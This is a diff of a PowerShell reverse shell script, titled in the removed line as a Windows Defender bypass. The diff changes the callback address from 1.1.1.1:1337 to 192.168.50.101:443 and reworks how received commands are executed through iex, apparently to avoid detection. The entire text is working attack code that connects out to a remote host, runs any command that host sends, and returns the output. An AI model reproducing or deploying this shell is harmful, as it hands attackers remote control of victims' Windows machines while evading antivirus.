@@ -1,10 +1,11 @@
-# Windows Defender Powershell Reverse Shell Bypass
-$amit = New-Object System.Net.Sockets.TCPClient("1.1.1.1",1337);
+$amit = New-Object System.Net.Sockets.TCPClient("192.168.50.101",443);
 $amit = $amit.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
-while(($i = $amit.Read($bytes, 0, $bytes.Length)) -ne 0){;$bruh = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$dback = (iex $bruh 2>&1 | Out-String );
+while(($i = $amit.Read($bytes, 0, $bytes.Length)) -ne 0){;
+$bruh = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$dback = (iex ". { $bruh } 2>&1" | Out-String );
 $dback2  = $dback + $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('.\') + " > ";
-$sdata = ([text.encoding]::ASCII).GetBytes($dback2);
+$sdata =([text.encoding]::ASCII).GetBytes($dback2);
 $amit.Write($sdata,0,$sdata.Length);
 $amit.Flush()};
 $amit.Close()
